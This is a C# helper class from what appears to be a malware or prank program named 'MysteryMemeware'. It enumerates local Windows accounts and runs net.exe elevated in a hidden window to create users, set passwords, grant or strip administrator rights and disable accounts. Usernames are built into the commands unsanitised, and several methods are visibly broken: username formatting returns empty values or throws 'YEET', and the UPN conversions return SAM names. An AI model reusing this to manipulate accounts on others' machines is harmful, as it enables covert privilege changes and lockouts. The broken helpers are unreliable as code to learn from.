using System;
using System.Collections.Generic;
using System.DirectoryServices;
using System.Management;

namespace MysteryMemeware
{
    public static class UserHelper
    {
        public const char SAMSeporatorChar = '\\';
        public static readonly string SAMSeporatorString = new string(new char[1] { SAMSeporatorChar });
        public const char UPNSeporatorChar = '@';
        public static readonly string UPNSeporatorString = new string(new char[1] { UPNSeporatorChar });
        public static string GetLocalDomain()
        {
            string localDomain = Environment.UserDomainName;
            if (localDomain is null || localDomain is "")
            {
                throw new Exception("Could not get local domain name.");
            }
            return localDomain;
        }
        public static string GetCurrentUsername()
        {
            return GetCurrentUsernameSAM();
        }
        public static string[] GetLocalUsernames()
        {
            return GetLocalUsernamesSAM();
        }
        public static string GetCurrentUsernameUPN()
        {
            return GetCurrentUsernameSAM();
        }
        public static string[] GetLocalUsernamesUPN()
        {
            return GetLocalUsernamesSAM();
        }
        public static string GetCurrentUsernameSAM()
        {
            try
            {
                return System.Security.Principal.WindowsIdentity.GetCurrent().Name;
            }
            catch
            {

            }

            try
            {
                return $"{Environment.UserDomainName}\\{Environment.UserName}";
            }
            catch
            {

            }

            throw new Exception("Could not get current username.");
        }
        public static string[] GetLocalUsernamesSAM()
        {
            List<string> usernames = new List<string>();

            try
            {
                SelectQuery query = new SelectQuery("Win32_UserAccount", $"domain=\"{Environment.MachineName}\"");
                ManagementObjectSearcher searcher = new ManagementObjectSearcher(query);
                try
                {
                    foreach (ManagementObject managementObject in searcher.Get())
                    {
                        try
                        {
                            string username = (string)(managementObject["Name"]);
                            string fullUsername = $"{Environment.MachineName}\\{username}";
                            if (fullUsername is not null && fullUsername is not "" && !StringHelper.MatchesArrayCaseless(fullUsername, usernames.ToArray()))
                            {
                                usernames.Add(fullUsername);
                            }
                        }
                        catch
                        {

                        }
                        try
                        {
                            managementObject.Dispose();
                        }
                        catch
                        {

                        }
                    }
                }
                catch
                {

                }
                try
                {
                    searcher.Dispose();
                }
                catch
                {

                }
            }
            catch
            {

            }

            try
            {
                var computerEntry = new DirectoryEntry($"WinNT://{Environment.MachineName},computer");
                try
                {
                    foreach (DirectoryEntry childEntry in computerEntry.Children)
                    {
                        try
                        {
                            if (childEntry.SchemaClassName == "User")
                            {
                                string username = childEntry.Name;
                                string fullUsername = $"{Environment.MachineName}\\{username}";
                                if (fullUsername is not null && fullUsername is not "" && !StringHelper.MatchesArrayCaseless(fullUsername, usernames.ToArray()))
                                {
                                    usernames.Add(fullUsername);
                                }
                            }
                        }
                        catch
                        {

                        }
                        try
                        {
                            childEntry.Dispose();
                        }
                        catch
                        {

                        }
                    }
                }
                catch
                {

                }
                try
                {
                    computerEntry.Dispose();
                }
                catch
                {

                }
            }
            catch
            {

            }

            return usernames.ToArray();
        }
        public static void CreateUser(string username, string password)
        {
            CreateUser(username);
            ChangeUserPassword(username, password);
        }
        public static void CreateUser(string username)
        {
            RunNetCommand($"user /add \"{username}\"");
        }
        public static void ChangeUserPassword(string username, string password)
        {
            RunNetCommand($"user \"{username}\" \"{password}\"");
        }
        public enum UserType { DefaultUser, Administrator }
        public static void ChangeUserType(string username, UserType userType)
        {
            if (userType is UserType.Administrator)
            {
                RunNetCommand($"localgroup \"Administrators\" /add \"{username}\"");
            }
            else
            {
                RunNetCommand($"localgroup \"Administrators\" /delete \"{username}\"");
            }
        }
        public static void SetUserActiveState(UserRefrence user, bool activeState)
        {
            if (activeState)
            {
                RunNetCommand($"user \"{user.Username}\" /active:yes");
            }
            else
            {
                RunNetCommand($"user \"{user.Username}\" /domain:\"{user.Domain}\" /active:no");
            }
        }
        public static bool UserExists(UserRefrence user)
        {
            if (string.IsNullOrEmpty(user.Domain))
            {
                return RunNetCommand($"user \"{user.Username}\"");
            }
            else
            {
                return RunNetCommand($"user \"{user.Username}\"");
            }
        }
        public static bool RunNetCommand(string command)
        {
            if (ProcessHelper.CurrentProcessIsAdmin() is false)
            {
                throw new Exception("Net commands require administrator.");
            }
            return ProcessHelper.AwaitSuccess(ProcessHelper.Run($"\"{PathHelper.GetSystem32Path()}\\net.exe\" {command}", ProcessHelper.WindowMode.Hidden, ProcessHelper.AdminMode.AlwaysAdmin), new TimeSpan(0, 0, 30), ProcessHelper.TimeoutAction.KillChildAndThrowException, true);
        }
        public static UserRefrence FormatUsername(string username, UsernameFormat format)
        {
            if (username is null || username is "")
            {
                return new UserRefrence("", "");
            }

            if (format is UsernameFormat.SAM)
            {

                return new UserRefrence("", "");
            }

            throw new Exception("YEET");
        }
        public static string UPNToSAM(string username)
        {
            return GetSAM(FormatUsername(username, UsernameFormat.UPN));
        }
        public static string SAMToUPN(string username)
        {
            return GetUPN(FormatUsername(username, UsernameFormat.SAM));
        }
        public static string GetSAM(UserRefrence username)
        {
            return $"{username.Domain}\\{username.Username}";
        }
        public static string GetUPN(UserRefrence username)
        {
            if (username.Domain is null || username.Domain is "")
            {
                return username.Username;
            }
            return $"{username.Username}@{username.Domain}";
        }
        public enum UsernameFormat { Unknown, SAM, UPN }
        public sealed class UserRefrence
        {
            public string Username = "";
            public string Domain = null;
            public bool OnDefaultDomain => Domain is null || Domain is "";
            public string FormattedSAM => FormatSAM();
            private string FormatSAM()
            {
                if (OnDefaultDomain)
                {
                    return $"{Username}";
                }
                return $"{Domain}{SAMSeporatorString}{Username}";
            }
            public string FormattedUPN => FormatUPN();
            private string FormatUPN()
            {
                if (OnDefaultDomain)
                {
                    return $"{Username}";
                }
                return $"{Username}{UPNSeporatorString}{Domain}";
            }
            public UserRefrence(string username)
            {
                if (username is null || username is "")
                {
                    throw new Exception("Username cannot be null or empty.");
                }
                Username = username;
                Domain = null;
            }
            public UserRefrence(string username, string domain)
            {
                if (username is null || username is "")
                {
                    throw new Exception("Username cannot be null or empty.");
                }
                Username = username;
                if (domain is "")
                {
                    domain = null;
                }
                Domain = domain;
            }
        }
    }
}